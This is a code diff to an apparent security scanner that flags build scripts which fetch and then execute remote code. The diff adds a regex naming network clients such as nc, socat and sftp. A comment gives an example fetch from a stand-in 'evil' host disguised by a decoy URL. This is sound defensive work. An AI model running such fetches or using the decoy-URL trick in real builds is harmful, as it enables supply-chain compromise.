@@ -1368,6 +1368,13 @@ _PHASE_RANK = {"pkgver": 0, "prepare": 1, "build": 2, "check": 3, "package": 4}
 #: own output; it is never the execution of a fetched artifact.
 _PKGDIR_LINE_RE = re.compile(r"\$\{?pkgdir\}?")
 
+#: Clients whose remote is named by a host operand, not a URL.  A declared
+#: URL elsewhere on the same line is a decoy argument, not this fetch's
+#: address: `sftp -b - u@evil "https://declared/x.tar.gz"` still brings
+#: bytes from evil, so the scheme guard below must not silence it.
+_HOST_FORM_FETCH_RE = re.compile(
+    r"(?:sftp|ssh|scp|ftp|tftp|nc|ncat|netcat|lftp|socat)\b", re.IGNORECASE)
+
 #: An interpreter whose script arrives on stdin through a process
 #: substitution: `python3 < <(curl URL)`.  The interpreter reads the
 #: fetch's output, so the capture is tested for a fetch client.
@@ -1568,7 +1575,8 @@ def _fetch_then_execute_findings(diff_text, config, add, current_text=None) -> N
                 fetched_by_fn.setdefault(fn, []).append(wpath)
 
         client = _FETCH_CLIENT_RE.search(body)
-        if (client and "://" not in body
+        host_form = bool(client and _HOST_FORM_FETCH_RE.match(client.group(0)))
+        if (client and (host_form or "://" not in body)
                 and not claims_pipe_to_shell(body)
                 and not claims_upload_line(body, config)):
             pending_fetch.append(
